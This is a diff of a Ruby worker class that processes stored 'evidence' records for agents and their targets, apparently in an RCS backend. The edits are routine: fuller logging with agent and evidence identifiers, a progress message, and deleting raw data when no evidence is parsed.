@@ -45,7 +45,7 @@ class InstanceWorker
 
     @target = @agent.get_parent
 
-    trace :info, "Created processor for agent #{@agent['ident']}:#{@agent['instance']}"
+    trace :info, "Created processor for agent #{@agent['ident']}:#{@agent['instance']} (target #{@target['_id']})"
     
     # the log key is passed as a string taken from the db
     # we need to calculate the MD5 and use it in binary form
@@ -59,6 +59,8 @@ class InstanceWorker
         until @evidences.empty?
           resume
           evidence_id = BSON::ObjectId(@evidences.shift)
+
+          trace :debug, "[#{@agent['ident']}:#{@agent['instance']}] still #{@evidences.size} evidences to go ..."
 
           begin
             start_time = Time.now
@@ -88,7 +90,11 @@ class InstanceWorker
               next
             end
 
-            next if evidences.nil?
+            # if evidences is nil, emulate there's no evidence, delete raw
+            if evidences.nil?
+              evidences = Array.new
+              action = :delete_raw
+            end
 
             ev_type = ''
 
@@ -137,8 +143,8 @@ class InstanceWorker
             sleep 5
             retry
           rescue Exception => e
-            trace :fatal, "FAILURE: " << e.to_s
-            trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
+            trace :fatal, "[#{evidence_id}] FAILURE: " << e.to_s
+            trace :fatal, "[#{evidence_id}] EXCEPTION: " + e.backtrace.join("\n")
 
             Dir.mkdir "forwarded" unless File.exists? "forwarded"
             path = "forwarded/#{evidence_id}.raw"
@@ -171,7 +177,7 @@ class InstanceWorker
   def put_to_sleep
     @state = :stopped
     #RCS::EvidenceManager.instance.sync_status({:instance => @agent['instance']}, RCS::EvidenceManager::SYNC_IDLE)
-    trace :debug, "processor #{self.object_id} is sleeping too much, let's stop!"
+    trace :debug, "processor #{@agent['ident']}:#{@agent['instance']} is sleeping too much, let's stop!"
   end
   
   def stopped?
@@ -191,16 +197,15 @@ class InstanceWorker
 
     @semaphore.synchronize do
       if stopped?
-        trace :debug, "deferring work for #{@agent['instance']}"
+        trace :debug, "deferring work for #{@agent['ident']}:#{@agent['instance']}"
         EM.defer @process
       end
     end
   end
 
   def to_s
-    "instance #{@agent['instance']}: #{@evidences.size}"
+    "#{@agent['ident']}:#{@agent['instance']}: #{@evidences.size}"
   end
-  
 end
 
 end # ::Worker
